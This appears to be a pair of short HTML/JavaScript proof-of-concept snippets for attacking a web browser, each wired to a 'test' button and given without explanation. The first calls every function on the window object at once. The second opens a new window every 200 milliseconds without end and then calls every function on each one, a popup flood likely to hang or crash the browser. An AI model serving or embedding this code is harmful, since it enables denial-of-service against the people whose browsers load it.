<script language="javascript">   
function b() {              
for(var p in self){  if(typeof(self[p])=="function"){   
 try  { self[p](); } catch (e)   {}   
             }
}  }

</script> 

<input type=button value=test onclick="b()">

or

<script language="javascript">   
function allPrpos(obj) {      
      var props = "";           
      for(var p in obj){          
            if(typeof(obj[p])=="function"){   
       try{   obj[p]();    }  catch (e){}   
             }
                       
  
       }   
   
       document.write(props);   
}   
   
function createWin() {
	setInterval('c()',200)
} 
function c() {
newWin = window.open ("/");  
	setTimeout(function(){allPrpos(newWin)},1000); 
}
</script> 

<button onclick="createWin()">test</button>
